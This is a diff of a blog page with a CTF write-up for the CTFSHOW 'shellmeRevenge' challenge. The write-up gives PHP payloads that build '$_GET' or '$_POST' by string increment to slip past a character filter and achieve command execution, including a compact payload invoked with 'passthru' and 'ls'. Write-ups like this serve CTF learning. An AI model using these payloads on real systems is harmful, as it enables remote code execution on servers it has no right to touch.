@@ -120,7 +120,7 @@
 									
 								</h1>
 								
-									<p id="/2023/09/24/CTFSHOW-shellmeRevenge-wp/" class="leancloud-visitors view"
+									<p id="/2023/09/12/CTFSHOW-shellmeRevenge-wp/" class="leancloud-visitors view"
 										data-flag-title="CTFSHOW-shellmeRevenge-wp">
 										<i class="fa fa-eye"></i> <i class="leancloud-visitors-count"></i>
 									</p>
@@ -151,9 +151,9 @@
 
 <p>这里发现过滤了除<code>C</code>以外的字母  除<code>0-3</code>以外的数字</p>
 <p><code>^</code>被过滤  用不了异或；<code>~</code>被过滤  用不了取反   两个引号都被过滤</p>
-<h2 id="0x1-exp"><a href="#0x1-exp" class="headerlink" title="0x1 exp"></a>0x1 exp</h2><p>这里考虑自增   这里不知道是不是作者弄错了第10行中的判断条件用的是<code>||</code>  所以就算长度超了107也没事  那我们先不管长度  用自增构造<code>$_GET[1]($_GET[2])</code></p>
+<h2 id="0x2-exp"><a href="#0x2-exp" class="headerlink" title="0x2 exp"></a>0x2 exp</h2><p>这里考虑自增   这里不知道是不是作者弄错了第10行中的判断条件用的是<code>||</code>  所以就算长度超了107也没事  那我们先不管长度  用自增构造<code>$_GET[1]($_GET[2])</code></p>
 <p>注意因为过滤了引号   直接<code>$a._</code>也可以实现连接  但调试的话php版本最好也是7.2  高版本这种操作可能不行</p>
-<h3 id="长度不限"><a href="#长度不限" class="headerlink" title="长度不限"></a>长度不限</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$_</span>=[]._;	</span><br><span class="line"><span class="variable">$_</span>=<span class="variable">$_</span>[<span class="number">0</span>];</span><br><span class="line"><span class="variable">$_</span>++;</span><br><span class="line"><span class="variable">$_</span>++;</span><br><span class="line"><span class="variable">$_</span>++;</span><br><span class="line"><span class="variable">$_</span>++;<span class="comment">//E</span></span><br><span class="line"><span class="variable">$__</span>=<span class="variable">$_</span>;<span class="comment">//E</span></span><br><span class="line"><span class="variable">$_</span>++;<span class="comment">//</span></span><br><span class="line"><span class="variable">$_</span>++;<span class="comment">//G</span></span><br><span class="line"><span class="variable">$___</span>=<span class="variable">$_</span>;<span class="comment">//G</span></span><br><span class="line"><span class="variable">$_</span>++;<span class="variable">$_</span>++;<span class="variable">$_</span>++;<span class="variable">$_</span>++;<span class="variable">$_</span>++;<span class="variable">$_</span>++;<span class="variable">$_</span>++;<span class="variable">$_</span>++;<span class="variable">$_</span>++;<span class="variable">$_</span>++;<span class="variable">$_</span>++;<span class="variable">$_</span>++;<span class="variable">$_</span>++;<span class="comment">//T</span></span><br><span class="line"><span class="variable">$_</span>=<span class="variable">$___</span>.<span class="variable">$__</span>.<span class="variable">$_</span>;<span class="comment">//GET</span></span><br><span class="line"><span class="comment">// echo $_;</span></span><br><span class="line"><span class="variable">$_</span>=_.<span class="variable">$_</span>;	<span class="comment">// _GET</span></span><br><span class="line"><span class="comment">// $$_[1]($$_[2]));</span></span><br><span class="line"><span class="comment">// $_GET[1]($_GET[2])</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<h3 id="长度不限"><a href="#长度不限" class="headerlink" title="长度不限"></a>长度不限</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$_</span>=[]._;	</span><br><span class="line"><span class="variable">$_</span>=<span class="variable">$_</span>[<span class="number">0</span>];</span><br><span class="line"><span class="variable">$_</span>++;<span class="variable">$_</span>++;<span class="variable">$_</span>++;<span class="variable">$_</span>++;	<span class="comment">//E</span></span><br><span class="line"><span class="variable">$__</span>=<span class="variable">$_</span>;	<span class="comment">//E</span></span><br><span class="line"><span class="variable">$_</span>++;<span class="variable">$_</span>++;	<span class="comment">//G</span></span><br><span class="line"><span class="variable">$___</span>=<span class="variable">$_</span>;	<span class="comment">//G</span></span><br><span class="line"><span class="variable">$_</span>++;<span class="variable">$_</span>++;<span class="variable">$_</span>++;<span class="variable">$_</span>++;<span class="variable">$_</span>++;<span class="variable">$_</span>++;<span class="variable">$_</span>++;<span class="variable">$_</span>++;<span class="variable">$_</span>++;<span class="variable">$_</span>++;<span class="variable">$_</span>++;<span class="variable">$_</span>++;<span class="variable">$_</span>++;<span class="comment">//T</span></span><br><span class="line"><span class="variable">$_</span>=_.<span class="variable">$___</span>.<span class="variable">$__</span>.<span class="variable">$_</span>;<span class="comment">//_GET</span></span><br><span class="line"><span class="variable">$_</span>=_.<span class="variable">$_</span>;	<span class="comment">// _GET</span></span><br><span class="line"><span class="comment">// $$_[1]($$_[2]));</span></span><br><span class="line"><span class="comment">// $_GET[1]($_GET[2])</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
 
 <p>去掉换行</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$_</span>=[]._;<span class="variable">$_</span>=<span class="variable">$_</span>[<span class="number">0</span>];<span class="variable">$_</span>++;<span class="variable">$_</span>++;<span class="variable">$_</span>++;<span class="variable">$_</span>++;<span class="variable">$__</span>=<span class="variable">$_</span>;<span class="variable">$_</span>++;<span class="variable">$_</span>++;<span class="variable">$___</span>=<span class="variable">$_</span>;<span class="variable">$_</span>++;<span class="variable">$_</span>++;<span class="variable">$_</span>++;<span class="variable">$_</span>++;<span class="variable">$_</span>++;<span class="variable">$_</span>++;<span class="variable">$_</span>++;<span class="variable">$_</span>++;<span class="variable">$_</span>++;<span class="variable">$_</span>++;<span class="variable">$_</span>++;<span class="variable">$_</span>++;<span class="variable">$_</span>++;<span class="variable">$_</span>=<span class="variable">$___</span>.<span class="variable">$__</span>.<span class="variable">$_</span>;<span class="variable">$_</span>=_.<span class="variable">$_</span>;<span class="variable">$$_</span>[<span class="number">1</span>](<span class="variable">$$_</span>[<span class="number">2</span>]);</span><br></pre></td></tr></table></figure>
@@ -166,7 +166,13 @@
 <h3 id="长度-lt-x3D-107"><a href="#长度-lt-x3D-107" class="headerlink" title="长度&lt;&#x3D;107"></a>长度&lt;&#x3D;107</h3><p>如果<code>10#</code>中的<code>||</code>换成<code>&amp;&amp;</code>的话  就需要压缩我们的payload了</p>
 <p>思路：<code>C -&gt; E -&gt; G</code>        <code>T</code>离得比较远 可以通过<code>C/C.C</code>获取到<code>NANC</code>进而  <code>N-&gt;T</code>  </p>
 <p><strong>这里</strong>可能有人会想为什么不从<code>Array</code>当中取出<code>r</code>然后到<code>t</code>呢 ？ php对于函数名类名大小写不敏感  但是对于<code>$_GET, $_POST</code>这一类变量是大小写敏感的  所以构造出的<code>$_GEt</code>发挥不了作用</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$C</span>=(C/C.C)[<span class="number">0</span>];	<span class="comment">// N</span></span><br><span class="line"><span class="variable">$C</span>++;<span class="variable">$C</span>++;<span class="variable">$C</span>++;<span class="variable">$C</span>++;<span class="variable">$C</span>++;	<span class="comment">// S，不直接到T  下面拼接的时候行内自增</span></span><br><span class="line"><span class="variable">$_</span>=C;	</span><br><span class="line"><span class="variable">$_</span>++;<span class="variable">$_</span>++;	<span class="comment">// E</span></span><br><span class="line"><span class="variable">$C</span>=<span class="variable">$_</span>.++<span class="variable">$C</span>;		<span class="comment">// ET</span></span><br><span class="line"><span class="variable">$_</span>++;	<span class="comment">// F	与第2行逻辑相同</span></span><br><span class="line"><span class="variable">$_</span>=_.++<span class="variable">$_</span>.<span class="variable">$C</span>;	<span class="comment">// _GET</span></span><br><span class="line"><span class="variable">$$_</span>[<span class="number">1</span>](<span class="variable">$$_</span>[<span class="number">2</span>]);</span><br><span class="line"></span><br><span class="line"><span class="comment">// $C=(C/C.C)[0];$C++;$C++;$C++;$C++;$C++;$_=C;$_++;$_++;$C=$_.++$C;$_++;$_=_.++$_.$C;$$_[1]($$_[2]);</span></span><br><span class="line"><span class="comment">// strlen=98</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$C</span>=(C/C.C)[<span class="number">0</span>];	<span class="comment">// N</span></span><br><span class="line"><span class="variable">$C</span>++;<span class="variable">$C</span>++;<span class="variable">$C</span>++;<span class="variable">$C</span>++;<span class="variable">$C</span>++;	<span class="comment">// S，不直接到T  下面拼接的时候行内自增</span></span><br><span class="line"><span class="variable">$_</span>=C;	</span><br><span class="line"><span class="variable">$_</span>++;<span class="variable">$_</span>++;	<span class="comment">// E</span></span><br><span class="line"><span class="variable">$C</span>=<span class="variable">$_</span>.++<span class="variable">$C</span>;		<span class="comment">// ET</span></span><br><span class="line"><span class="variable">$_</span>++;	<span class="comment">// F	与第2行逻辑相同</span></span><br><span class="line"><span class="variable">$_</span>=_.++<span class="variable">$_</span>.<span class="variable">$C</span>;	<span class="comment">// _GET</span></span><br><span class="line"><span class="variable">$$_</span>[<span class="number">0</span>](<span class="variable">$$_</span>[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line"><span class="comment">// $C=(C/C.C)[0];$C++;$C++;$C++;$C++;$C++;$_=C;$_++;$_++;$C=$_.++$C;$_++;$_=_.++$_.$C;$$_[1]($$_[2]);</span></span><br><span class="line"><span class="comment">// strlen=98</span></span><br></pre></td></tr></table></figure>
+
+<p>更小：直接<code>N -&gt; O -&gt; P -&gt; S -&gt; T</code></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$_</span>=(_/_._)[<span class="number">0</span>];	<span class="comment">// N</span></span><br><span class="line">++<span class="variable">$_</span>;	<span class="comment">// O</span></span><br><span class="line"><span class="variable">$__</span>=_.<span class="variable">$_</span>.<span class="variable">$_</span>++;		<span class="comment">// _PO</span></span><br><span class="line"><span class="variable">$_</span>++;<span class="variable">$_</span>++;</span><br><span class="line"><span class="variable">$_</span>=<span class="variable">$__</span>.++<span class="variable">$_</span>.++<span class="variable">$_</span>;	<span class="comment">// _POST</span></span><br><span class="line"><span class="variable">$$_</span>[<span class="number">0</span>](<span class="variable">$$_</span>[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line"><span class="comment">// $_=(_/_._)[0];$__=++$_;$__=_.++$_.$__;$_++;$_++;$_=$__.++$_.++$_;$$_[0]($$_[1]);</span></span><br><span class="line"><span class="comment">// strlen=80   注意这里是POST了 跟GET传参方式不同</span></span><br></pre></td></tr></table></figure>
+
+<p>再压缩：将<code>_POST</code>作为POST的参数</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$_</span>=(_/_._)[_];                     <span class="comment">// N  注意这里的索引0有的php版本下也可以替换为非数字字符</span></span><br><span class="line">++<span class="variable">$_</span>;                              </span><br><span class="line"><span class="variable">$__</span>=<span class="variable">$_</span>.<span class="variable">$_</span>++;                       <span class="comment">// PO</span></span><br><span class="line">++<span class="variable">$_</span>;++<span class="variable">$_</span>;                         </span><br><span class="line"><span class="variable">$$_</span>[<span class="variable">$_</span>=_.<span class="variable">$__</span>.++<span class="variable">$_</span>.++<span class="variable">$_</span>](<span class="variable">$$_</span>[_]);   <span class="comment">// $$_[_POST]($$_[_])即$_POST[]($_POST[_])</span></span><br><span class="line"><span class="comment">// $_=(_/_._)[_];++$_;$__=$_.$_++;++$_;++$_;$$_[$_=_.$__.++$_.++$_]($$_[_]);</span></span><br><span class="line"><span class="comment">// strlen=73 		POST  _=ls&amp;_POST=passthru</span></span><br></pre></td></tr></table></figure>
 
 <p>删去换行 url编码后同样可以实现功能</p>
 <p>几个压缩点：</p>
@@ -175,6 +181,7 @@
 <li>多字符串一行拼接<code>$_=_.++$_.$C;</code></li>
 <li>找就近字母递增，过程中有遇到符合的记录下，不每次从头开始</li>
 <li><code>_/_, 0/0, C/C</code>都可以得到<code>NAN</code></li>
+<li><code>[0], [&#39;&#39;==&#39;.&#39;], [_]</code>都有可能起到同样作用</li>
 </ol>
 
 	  <div class="article-footer-copyright">
@@ -185,7 +192,7 @@
 	</div>
 
 	<!-- 
-		<span id="/2023/09/24/CTFSHOW-shellmeRevenge-wp/" class="leancloud-visitors view" data-flag-title="CTFSHOW-shellmeRevenge-wp">
+		<span id="/2023/09/12/CTFSHOW-shellmeRevenge-wp/" class="leancloud-visitors view" data-flag-title="CTFSHOW-shellmeRevenge-wp">
 			<i class="fa fa-eye"></i> <i class="leancloud-visitors-count"></i>
 		</span>
 	 -->
@@ -197,12 +204,13 @@
 
     
     
-    <a type="button" class="btn btn-default disabled"><i class="fa fa-arrow-circle-o-left"></i>Prev</a>
+    <a href="/2023/09/16/HCTF2018-theEnd-wp/" type="button" class="btn btn-default"><i
+                class="fa fa-arrow-circle-o-left"></i> Prev</a>
     
 
     <a href="/" type="button" class="btn btn-default"><i class="fa fa-home"></i>Home</a>
     
-    <a href="/2023/09/21/wdb2018-blind-wp/" type="button" class="btn btn-default ">Next<i
+    <a href="/2023/09/08/De1ctf2019-SSRFMe-wp/" type="button" class="btn btn-default ">Next<i
                 class="fa fa-arrow-circle-o-right"></i></a>
     
 
@@ -261,7 +269,7 @@ new Valine(valineConfig);
 	
 	<div class="meta-widget">
 	<i class="fa fa-clock-o"></i>
-	2023-09-24 
+	2023-09-12 
 	</div>
 	
 
@@ -272,7 +280,7 @@ new Valine(valineConfig);
     <ul id="categorys" class="tag_box list-unstyled collapse in">
           
   <li>
-    <li><a href="/categories/web-wp/">web-wp<span>39</span></a></li>
+    <li><a href="/categories/web-wp/">web-wp<span>41</span></a></li>
   </li>
 
     </ul>
@@ -285,7 +293,7 @@ new Valine(valineConfig);
 	<a data-toggle="collapse" data-target="#tags"><i class="fa fa-tags"></i></a>		  
     <ul id="tags" class="tag_box list-unstyled collapse in">	  
 	    
-  <li><a href="/tags/CTF/">CTF<span>70</span></a></li> <li><a href="/tags/web/">web<span>42</span></a></li> <li><a href="/tags/rce/">rce<span>10</span></a></li> <li><a href="/tags/吃瓜杯/">吃瓜杯<span>1</span></a></li> <li><a href="/tags/CTFSHOW/">CTFSHOW<span>1</span></a></li>
+  <li><a href="/tags/CTF/">CTF<span>73</span></a></li> <li><a href="/tags/web/">web<span>45</span></a></li> <li><a href="/tags/rce/">rce<span>13</span></a></li> <li><a href="/tags/吃瓜杯/">吃瓜杯<span>1</span></a></li> <li><a href="/tags/CTFSHOW/">CTFSHOW<span>2</span></a></li> <li><a href="/tags/无字母rce/">无字母rce<span>3</span></a></li>
     </ul>
 	</div>
 		
